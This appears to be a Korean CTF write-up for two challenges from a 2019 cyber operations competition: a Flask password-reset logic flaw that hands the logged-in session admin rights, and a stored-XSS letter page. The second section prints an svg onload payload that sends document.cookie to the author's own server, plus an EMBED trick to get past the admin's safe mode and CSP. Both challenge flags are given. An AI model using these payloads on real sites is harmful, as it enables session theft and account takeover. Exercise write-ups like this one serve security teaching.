# 2019 사이버작전 경연대회
1.1 Hidden Command(100)
1.2 The Camp(413)

# 1.1 Hidden Command(100)
게시판 사이트가 있고, flask 소스코드가 주어졌다. 처음에 사이트 구조 파악할때 CTF에 굳이 비밀번호 찾기를 왜 만들었을까? 라는 고민을 했었는데 정작 해당 함수는 주의깊게 살펴보지 않았다. 아래는 비밀번호를 찾는 forget() 함수의 코드다.
``` PYTHON
@frontend.route("/forget", methods=["GET", "POST"])
def forget():
    form = ForgetForm(request.form)
    msg = None
    if request.method == "POST" and form.validate():
        msg = "User not found"
        user = User.query.filter_by(username = form.username.data, email = form.email.data).first()
        if user:
            new_password = rand_password(10)
            # 랜덤 패스워드를 통해 DB에 계정 새로 생성
            new_user = User(form.username.data, new_password, form.email.data)

            # 기존 계정은 admin으로 덮어쓴다.
            clear_user(user)
            db_session.add(new_user)

            # 게시글 작성자를 모두 admin으로 바꾼다.
            board_lst = Board.query.filter_by(username = form.username.data).all()
            for b in board_lst:
                b.username = admin_username

            db_session.commit()
            return render_template("forget_res.html", password = new_password)
    return render_template("forget.html", msg = msg, form = form)
```
주석을 달아놓은 것처럼 아이디와 이메일이 일치하면 DB에 새로운 랜덤 비밀번호로 계정을 생성하고 기존 계정은 admin으로 덮어쓰고, 기존 게시글 작성자를 모두 admin으로 바꾼다. 이 함수에서 취약점이 발생하는데, 로그인한 상태에서 forget으로 이동할 수 있는 정상적인 방법은 없다. 하지만 url을 통해 접근하여 비밀번호 찾기를 진행하게 되면 내 계정은 새로 생기고, 기존 계정은 admin이 되므로 `현재 맺어져있는 세션이 admin`이 되게 된다. admin이 작성한 첫 번째 게시물을 확인하면 플래그가 나온다.  
flag : `FLAG{N0t_s3cur3_4t_411}`

# 1.2 The Camp(413)
군인에게 편지를 쓸 수 있는 홈페이지다. 홈, 편지쓰기, 편지보기 이렇게 3개의 탭으로 구성되어있다. 편지를 쓰면 서버에 편지가 올라가고, 친구에게 전송하기 버튼을 눌러야 전송이 된다. 전송이 되면 관리자가 열람 한 후 전달되며, 관리자가 열람했는지 안했는지 알려준다. 친절하게 세션을 따라고 문제에서 알려주었으니 다음과 같은 페이로드로 세션을 따면 된다.
```html
</textarea>
	<svg/onload=window.location.href='http://내서버/sasa?session='+document.cookie>
<textarea>
```
그런데 내가 편지를 확인할 때는 세션이 잘 오는데 관리자가 확인했다고 떴음에도 관리자의 세션이 오지 않았다. 자세히 살펴보니 관리자가 보는 페이지는 `세이프 모드`가 걸려있었다. 세이프모드는 인자를 전달해서 동작시킬 수 있는데 헤더를 잘 살펴보니 CSP가 걸려있었다. EMBED 태그를 이용해서 세이프모드가 걸리지 않은 페이지를 편지에 삽입하여 세션 탈취를 시도했다.
``` HTML
</textarea>
	<EMBED SRC="이전에 작성한 공격 편지주소" type="text/html" AllowScriptAccess="always">
</EMBED><textarea>
```
관리자 세션을 탈취했다. 세션 외에도 `cred`라는 플래그같이 생긴 쿠키도 존재했다. 두 쿠키 모두 적용했는데 별다른 변화가 없었다. HOME에서 소스를 보면 secret.php가 숨겨져 있음을 알 수 있다. 이 페이지에 접근하면 관리자 세션을 탈취했음에도 관리자가 아니라고 뜬다. `.secret.php.swp` 임시저장 파일이 남아있었고(이건 좀,,,), 이를 다운받아 보면 여러 페이지가 더 존재함을 알 수 있다. 최종적으로 탈취한 세션을 가지고 `http://52.78.85.107/admin.phar/flag.php` 에 접근하면 플래그를 던져준다.
```
Here is flag: FLAG{w0000h_RainbowReflect_PHP}
```
flag : `FLAG{w0000h_RainbowReflect_PHP}`
